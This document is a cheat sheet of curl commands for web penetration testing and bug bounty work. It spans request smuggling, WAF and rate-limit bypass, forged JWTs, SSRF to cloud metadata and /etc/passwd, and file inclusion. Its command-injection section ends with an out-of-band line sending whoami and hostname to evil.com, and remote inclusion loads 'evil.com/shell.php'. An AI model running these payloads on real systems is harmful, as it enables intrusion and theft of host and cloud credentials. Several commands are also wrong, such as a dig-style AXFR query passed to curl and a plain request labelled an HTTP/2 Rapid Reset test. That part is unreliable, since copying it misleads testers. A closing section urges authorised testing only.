# Advanced curl Commands for Web Penetration Testing & Bug Bounty

## Common curl Flags

| Flag | Description | Example Usage |
|------|-------------|--------------|
| `-I` | Show document info only (headers) | `curl -I https://target.com` |
| `-i` | Include protocol response headers in the output | `curl -i https://target.com` |
| `-v` | Make curl verbose during the operation | `curl -v https://target.com` |
| `-s` | Silent mode - don't show progress meter or error messages | `curl -s https://target.com` |
| `-H` | Pass custom header to server | `curl -H "X-Custom: value" https://target.com` |
| `-X` | Specify request method to use | `curl -X POST https://target.com` |
| `-d` | HTTP POST data | `curl -d "param=value" https://target.com` |
| `-u` | Specify username and password | `curl -u user:pass https://target.com` |
| `-b` | Send cookies from string/file | `curl -b "cookie=value" https://target.com` |
| `-c` | Write cookies to file after operation | `curl -c cookies.txt https://target.com` |
| `-L` | Follow redirects | `curl -L https://target.com` |
| `-o` | Write to file instead of stdout | `curl -o file.txt https://target.com` |
| `-O` | Write output to a local file named like the remote file | `curl -O https://target.com/file.txt` |
| `-w` | Use the output format after completion | `curl -w "%{http_code}\n" https://target.com` |
| `-0` | Force HTTP version 1.0 | `curl -0 https://target.com` |
| `--http2` | Force HTTP version 2 | `curl --http2 https://target.com` |
| `-k` | Allow insecure SSL connections | `curl -k https://target.com` |
| `-x` | Use specified proxy | `curl -x http://proxy:port https://target.com` |
| `-Z` | Parallel transfers | `curl -Z url1 url2 url3` |
| `-D` | Write the received headers to file | `curl -D headers.txt https://target.com` |
| `-J` | Remote file name in -O | `curl -O -J https://target.com/file` |
| `-z` | Time condition for file downloads | `curl -z "filename" https://target.com` |
| `--path-as-is` | Prevent dot-dot-slash normalization | `curl --path-as-is https://target.com/../../` |
| `--connect-timeout` | Maximum time for connection | `curl --connect-timeout 5 https://target.com` |
| `--max-time` | Maximum time for the transfer | `curl --max-time 10 https://target.com` |
| `--retry` | Retry on failure | `curl --retry 3 https://target.com` |
| `--tls13-ciphers` | Specify TLS 1.3 ciphers | `curl --tls13-ciphers TLS_AES_128_GCM_SHA256 https://target.com` |

## Advanced Information Gathering

```bash
# Get detailed timing information
curl -w "@curl-format.txt" -o /dev/null -s https://target.com

# Check for HTTP/2 support
curl -I --http2 https://target.com 2>&1 | grep -i 'HTTP/2'

# Check for HTTP Request Smuggling vulnerabilities
curl -X POST -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" https://target.com

# Test for CRLF injection
curl -H "X-Test: test%0d%0aX-Forwarded-Host: evil.com" https://target.com

# Check for DNS rebinding
curl --resolve target.com:80:127.0.0.1 http://target.com

# Test for DNS rebinding protection bypass
curl --connect-to ::target.com:80:127.0.0.1:80 http://target.com

# Check for DNS cache poisoning
curl --dns-servers 8.8.8.8 https://target.com

# Test for DNS zone transfer
curl -v -t AXFR @ns.target.com target.com
```

## Advanced Header Manipulation

```bash
# Bypass WAF/IPS with obfuscated headers
curl -H "X-Forwarded-For: 127.0.0.1, 10.0.0.1" \
     -H "X-Forwarded-Host: target.com" \
     -H "X-Originating-IP: 127.0.0.1" \
     -H "X-Remote-IP: 127.0.0.1" \
     -H "X-Remote-Addr: 127.0.0.1" \
     https://target.com

# Test for HTTP Request Smuggling (CL.TE)
curl -X POST \
     -H "Transfer-Encoding: chunked" \
     -H "Content-Length: 4" \
     -d "1\r\nZ\r\nQ\r\n\r\n" \
     https://target.com

# Test for HTTP/2 Downgrade
curl --http2-prior-knowledge -I https://target.com

# Test for HTTP/2 Rapid Reset (CVE-2023-44487)
curl --http2 --http2-no-server-push -v https://target.com

# Test for HTTP/2 CONTINUATION Flood
curl --http2 -H "Custom: $(printf 'A%.0s' {1..10000})" https://target.com
```

## Advanced Authentication & Session Testing

```bash
# Test for JWT vulnerabilities
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://target.com/api

# Test for OAuth token leakage
curl -H "Authorization: Bearer" https://target.com/api

# Test for JWT algorithm confusion
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1B5SgM5HnN7k4t8vQyZz9w" https://target.com/api

# Test for session fixation
curl -c cookie.txt -b "PHPSESSID=injected_session" https://target.com/login

# Test for session timeout
curl -b "session=valid_session_id; Max-Age=31536000" https://target.com/profile

# Test for session regeneration
curl -b "session=old_session_id" -c new_cookies.txt https://target.com/login
```

## Advanced Request Smuggling & Desync

```bash
# Test for CL.0 request smuggling
curl -X POST \
     -H "Content-Length: 6" \
     -H "Transfer-Encoding: chunked" \
     -d "0\r\n\r\nX" \
     https://target.com

# Test for TE.CL request smuggling
curl -X POST \
     -H "Transfer-Encoding: chunked" \
     -H "Content-Length: 3" \
     -d "8\r\nSMUGGLED\r\n0\r\n\r\n" \
     https://target.com

# Test for HTTP/2 Request Smuggling
curl --http2 \
     -H ":method: POST" \
     -H ":path: /" \
     -H ":authority: target.com" \
     -H "content-length: 0" \
     -H "transfer-encoding: chunked" \
     -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" \
     https://target.com
```

## Advanced API Testing

```bash
# Test for GraphQL introspection
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name,fields{name}}}}"}' \
     https://target.com/graphql

# Test for GraphQL batching attacks
curl -X POST \
     -H "Content-Type: application/json" \
     -d '[{"query":"query{user{id}}"},{"query":"mutation{deleteUser(id:1)}"}]' \
     https://target.com/graphql

# Test for GraphQL CSRF
curl -X GET \
     "https://target.com/graphql?query=mutation{deleteUser(id:1)}"

# Test for REST API mass assignment
curl -X PUT \
     -H "Content-Type: application/json" \
     -d '{"id":"123","role":"admin"}' \
     https://target.com/api/users/123
```

## Advanced SSRF Testing

```bash
# Test for AWS metadata access
curl "http://target.com/ssrf?url=http://169.254.169.254/latest/meta-data/"

# Test for GCP metadata access
curl "http://target.com/ssrf?url=http://metadata.google.internal/computeMetadata/v1/" \
     -H "Metadata-Flavor: Google"

# Test for Azure metadata access
curl "http://target.com/ssrf?url=http://169.254.169.254/metadata/instance?api-version=2020-06-01" \
     -H "Metadata: true"

# Test for SSRF with different URL schemes
curl "http://target.com/ssrf?url=file:///etc/passwd"
curl "http://target.com/ssrf?url=gopher://localhost:22/SSH-2.0-OpenSSH_7.6p1"
curl "http://target.com/ssrf?url=dict://localhost:22/info"
```

## Advanced Rate Limit Bypass

```bash
# Bypass rate limiting with X-Forwarded-For rotation
for i in {1..100}; do \
    curl -s -H "X-Forwarded-For: $((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))" \
         -w "%{http_code}\
" -o /dev/null https://target.com/api/endpoint \
    && sleep 0.5; 
done

# Bypass rate limiting with HTTP/2 multiplexing
curl --http2 -Z "https://target.com/api/endpoint" \
     -H "X-Forwarded-For: $((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))" \
     -o /dev/null -s -w "%{http_code}\
"

# Test for rate limit bypass via header case variation
curl -H "X-API-Key: valid-key" https://target.com/api
curl -H "x-api-key: valid-key" https://target.com/api
curl -H "X-Api-Key: valid-key" https://target.com/api
```

## Advanced Output Processing

```bash
# Extract all URLs from page
curl -s https://target.com | grep -Eo 'https?://[^\"<> ]+' | sort -u

# Monitor website changes with diff
curl -s https://target.com > current.html && \
while true; do \
    sleep 60 && \
    curl -s https://target.com > new.html && \
    diff -u current.html new.html && \
    mv new.html current.html; \
done

# Test for open redirect with payloads from file
while read -r payload; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -L "https://target.com/redirect?url=$payload")
    echo "$payload - $status"
done < redirect_payloads.txt

# Test for XSS with payloads from file
while read -r payload; do
    echo "Testing: $payload"
    curl -s -G --data-urlencode "q=$payload" https://target.com/search
    echo -e "\n---\n"
done < xss_payloads.txt
```

## Advanced SSL/TLS Testing

```bash
# Test for weak ciphers
for cipher in $(openssl ciphers 'ALL:eNULL' | tr ':' ' '); do
    result=$(curl -s -v --ciphers $cipher --tls-max 1.2 https://target.com 2>&1)
    if [[ $result == *"handshake failure"* ]]; then
        echo "[+] $cipher: Not supported"
    else
        echo "[!] $cipher: SUPPORTED - VULNERABLE"
    fi
done

# Test for TLS 1.3 downgrade
curl --tls-max 1.2 https://target.com
curl --tlsv1.3 https://target.com

# Test for CRIME (TLS compression)
curl --compressed https://target.com

# Test for BREACH
curl -H "Accept-Encoding: gzip,deflate" https://target.com

# Test for DROWN
curl --sslv3 https://target.com

# Test for POODLE
curl --tlsv1.0 --tls-max 1.0 https://target.com

# Test for BEAST
curl --ciphers 'AES128-SHA' --tlsv1.0 https://target.com
```

## Advanced Web Cache Deception

```bash
# Test for Web Cache Deception
curl -v -H "X-Forwarded-Host: evil.com" https://target.com/account.php/non-existent.css

# Test for Cache Poisoning via Unkeyed Headers
curl -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Scheme: http" https://target.com

# Test for Cache Key Normalization
curl "https://target.com/?param=value" -H "X-Forwarded-Host: evil.com"
curl "https://target.com/?param=value2" -H "X-Forwarded-Host: evil.com"
```

## Advanced WebSocket Testing

```bash
# Test for WebSocket security headers
curl -i -N -H "Connection: Upgrade" \
        -H "Upgrade: websocket" \
        -H "Sec-WebSocket-Version: 13" \
        -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
        https://target.com/ws

# Test for WebSocket origin validation
curl -i -N -H "Connection: Upgrade" \
        -H "Upgrade: websocket" \
        -H "Origin: https://evil.com" \
        -H "Sec-WebSocket-Version: 13" \
        -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
        wss://target.com/ws
```

## Advanced File Inclusion Testing

```bash
# Test for Local File Inclusion (LFI)
curl "https://target.com/page?file=../../../../etc/passwd"

# Test for Remote File Inclusion (RFI)
curl "https://target.com/page?file=http://evil.com/shell.php"

# Test for PHP wrappers
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "https://target.com/page?file=expect://id"
curl "https://target.com/page?file=data://text/plain,<?php phpinfo();?>"

# Test for null byte injection
curl "https://target.com/page?file=../../../../etc/passwd%00"
```

## Advanced Command Injection Testing

```bash
# Test for command injection with different separators
curl "https://target.com/cmd?input=;id"
curl "https://target.com/cmd?input=|id"
curl "https://target.com/cmd?input=||id"
curl "https://target.com/cmd?input=&&id"
curl "https://target.com/cmd?input=`id`"
curl "https://target.com/cmd?input=$(id)"

# Test for blind command injection with time delays
curl "https://target.com/cmd?input=sleep+5"

# Test for out-of-band command injection
curl "https://target.com/cmd?input=nslookup+$(whoami).$(hostname).evil.com"
```

## Important Security Notes

1. **Legal and Ethical Considerations**:
   - Always obtain proper authorization before testing
   - Respect robots.txt and terms of service
   - Be aware of local laws and regulations
   - Use a controlled testing environment when possible

2. **Rate Limiting**:
   - Implement delays between requests
   - Use rotating IP addresses when allowed
   - Respect server response headers (Retry-After, etc.)

3. **Data Protection**:
   - Do not exfiltrate or store sensitive data
   - Use secure connections (HTTPS) for all requests
   - Sanitize all inputs and outputs

4. **Best Practices**:
   - Keep detailed logs of all tests performed
   - Document all findings with proof of concept
   - Report vulnerabilities responsibly to the appropriate parties

5. **Tools Integration**:
   - Consider using specialized security tools (Burp Suite, OWASP ZAP, etc.)
   - Automate repetitive tasks with scripts
   - Use version control for your testing code

6. **Performance Considerations**:
   - Be mindful of server load
   - Test during off-peak hours when possible
   - Use appropriate timeouts and retry logic

Remember that with great power comes great responsibility. Always ensure you have explicit permission before testing any system that you do not own or have explicit authorization to test.
